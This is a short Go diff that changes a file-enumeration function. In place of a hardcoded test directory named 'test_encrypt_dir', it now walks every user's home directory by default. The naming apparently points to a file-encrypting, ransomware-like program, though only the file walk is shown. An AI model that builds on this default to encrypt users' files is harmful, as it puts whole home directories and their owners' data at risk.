@@ -5,20 +5,23 @@ import (
 	"os"
 	"path/filepath"
 	"runtime"
+
+	"github.com/joho/godotenv"
 )
 
 func GetAllFiles() []string {
 	var files []string
 	var dir string
 
-	if runtime.GOOS == "windows" {
+	godotenv.Load("../.env")
+	// Directory for testing the program, try to change it to your own directory
+	dir = os.Getenv("DIR")
+
+	if runtime.GOOS == "windows" && dir == "" {
 		dir = "C:\\Users\\"
-	} else {
+	} else if dir == "" {
 		dir = "/home/"
 	}
-
-	// Directory for testing the program, try to change it to your own directory
-	dir = "<your_dir>\\test_encrypt_dir\\"
 
 	err := filepath.Walk(dir,
 		func(path string, info os.FileInfo, err error) error {
